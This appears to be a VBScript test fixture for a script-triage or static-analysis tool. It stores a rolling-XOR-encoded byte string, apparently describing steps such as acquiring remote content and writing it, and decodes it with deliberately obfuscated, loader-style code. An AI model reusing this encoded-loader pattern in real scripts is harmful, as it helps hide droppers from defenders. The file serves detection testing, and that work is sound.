Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ad2fd009 = "0,61,12,112,3,119,18,98,17,44,77,46,95,42,67,49,84,11,121,28,113,30,106,15,35,84,38,79,59,94,1,103,14,98,7,123,26,126,31,111,27,126,12,49,102,15,97,41,93,41,89,119,32,73,39,111,27,111,31,77,40,89,44,73,58,78,96,85,123,74,54,69,49,80,55,82,13,110,1,116,26,110,83,97,29,126,31,114,2,99,10,109,3,92,53,81,108,15,110,3,115,18,123,28,114,95,108,85,109,95,108,85,109,94,61,11,119,2,112,28,33,73,61,73,57,74,112,95,112,67,122,66,112,67,122,66,113,18,36,10,111,23,118,27,107,7,98,76,37,75,61,92,48,89,61,18,37,64,120,78,44,29,121,78,96,4,101,17,109,24,107,14,124,35,66,37,64,46,90,103,47,90,52,64,50,87,36,87,27,122,24,55,4,61,5,55,4,61,5,54,85,99,31,121,16,124,25,70,54,87,35,75,118,53,15,83,6,117,16,98,17,77,29,104,10,102,15,108,48,120,13,99,23,101,0,115,0,76,45,79,19,96,20,117,18,119,90,105,80,104,90,105,80,104,91,56,14,32,68,37,81"
Const Codec_ad2fd009 = "decimal_comma|rolling_xor|76"

Function Load_ad2fd009()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_ad2fd009, ",")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_ad2fd009 = result
End Function

Function Decode_ad2fd009(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  previous = 118
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor previous
    previous = SoUrCeByTeS(ByTeInDeX)
  Next
  Decode_ad2fd009 = result
End Function

Function Recover_ad2fd009()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  If True Then
    NeUtRaL = (19 * 7) - 133
      SoUrCeByTeS = Load_ad2fd009()
      On Error Resume Next
      DeCoDeDByTeS = Decode_ad2fd009(SoUrCeByTeS)
      ErRoRnUmBeR = Err.Number
      ErRoRdEsCrIpTiOn = Err.Description
      On Error GoTo 0
      If ErRoRnUmBeR <> 0 Then Err.Raise ErRoRnUmBeR, "HuntressFixture", ErRoRdEsCrIpTiOn
      DeScRiPtOrTeXt = ""
      For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
        DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
      Next
  End If
  Recover_ad2fd009 = DeScRiPtOrTeXt
End Function

Function Inspect_ad2fd009()
  Inspect_ad2fd009 = Recover_ad2fd009()
End Function
